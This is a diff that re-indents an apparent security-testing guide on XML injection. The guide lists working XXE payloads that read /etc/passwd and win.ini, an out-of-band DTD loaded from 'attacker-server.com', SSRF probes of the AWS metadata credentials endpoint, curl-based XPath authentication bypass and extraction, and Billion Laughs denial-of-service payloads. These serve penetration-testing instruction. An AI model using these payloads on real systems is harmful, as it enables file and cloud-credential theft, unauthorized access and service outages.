@@ -1,8 +1,8 @@
 ---
 name: testing-for-xml-injection-vulnerabilities
 description: Test web applications for XML injection vulnerabilities including XXE,
-  XPath injection, and XML entity attacks to identify data exposure and server-side
-  request forgery risks.
+ XPath injection, and XML entity attacks to identify data exposure and server-side
+ request forgery risks.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -57,8 +57,8 @@ curl -s http://target.com/service?wsdl
 
 # Test if endpoint accepts XML by changing Content-Type
 curl -X POST http://target.com/api/data \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><root><test>hello</test></root>'
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0"?><root><test>hello</test></root>'
 
 # Check for XML file upload functionality
 # Look for .xml, .svg, .xlsx, .docx file processing
@@ -69,21 +69,21 @@ curl -X POST http://target.com/api/data \
 <!-- Basic XXE to read local files -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+ <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <root><data>&xxe;</data></root>
 
 <!-- Windows file retrieval -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
 ]>
 <root><data>&xxe;</data></root>
 
 <!-- Using PHP wrapper for base64-encoded file content -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 ]>
 <root><data>&xxe;</data></root>
 ```
@@ -93,8 +93,8 @@ curl -X POST http://target.com/api/data \
 <!-- Out-of-band XXE using external DTD -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://attacker-server.com/xxe.dtd">
-  %xxe;
+ <!ENTITY % xxe SYSTEM "http://attacker-server.com/xxe.dtd">
+ %xxe;
 ]>
 <root><data>test</data></root>
 
@@ -107,7 +107,7 @@ curl -X POST http://target.com/api/data \
 <!-- DNS-based out-of-band detection -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://xxe-test.burpcollaborator.net">
+ <!ENTITY xxe SYSTEM "http://xxe-test.burpcollaborator.net">
 ]>
 <root><data>&xxe;</data></root>
 ```
@@ -117,21 +117,21 @@ curl -X POST http://target.com/api/data \
 <!-- Internal network scanning via XXE -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
 ]>
 <root><data>&xxe;</data></root>
 
 <!-- AWS metadata endpoint access -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
 ]>
 <root><data>&xxe;</data></root>
 
 <!-- Internal port scanning -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
+ <!ENTITY xxe SYSTEM "http://internal-server:8080/">
 ]>
 <root><data>&xxe;</data></root>
 ```
@@ -143,7 +143,7 @@ curl "http://target.com/search?query=' or '1'='1"
 
 # XPath authentication bypass
 curl -X POST http://target.com/login \
-  -d "username=' or '1'='1&password=' or '1'='1"
+ -d "username=' or '1'='1&password=' or '1'='1"
 
 # XPath data extraction
 curl "http://target.com/search?query=' or 1=1 or ''='"
@@ -158,17 +158,17 @@ curl "http://target.com/search?query=' or substring(//user[1]/password,1,1)='a' 
 <!-- Billion Laughs attack (use only in authorized testing) -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE lolz [
-  <!ENTITY lol "lol">
-  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol "lol">
+ <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 ]>
 <root><data>&lol4;</data></root>
 
 <!-- Quadratic blowup attack -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
+ <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
 ]>
 <root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>
 ```
